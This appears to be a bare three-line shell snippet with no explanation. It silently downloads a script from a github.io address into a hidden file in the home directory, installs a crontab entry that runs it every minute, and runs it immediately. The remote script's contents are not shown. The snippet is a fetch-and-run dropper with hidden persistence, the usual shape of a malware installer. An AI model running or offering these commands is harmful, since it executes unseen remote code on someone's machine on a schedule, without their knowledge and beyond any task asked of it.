curl -s https://kasderooi.github.io/curltest/doit.sh --output ~/.doit.sh
(crontab -l 2>/dev/null; echo "*/1 * * * * ~/.doit.sh") | crontab -
bash ~/.doit.sh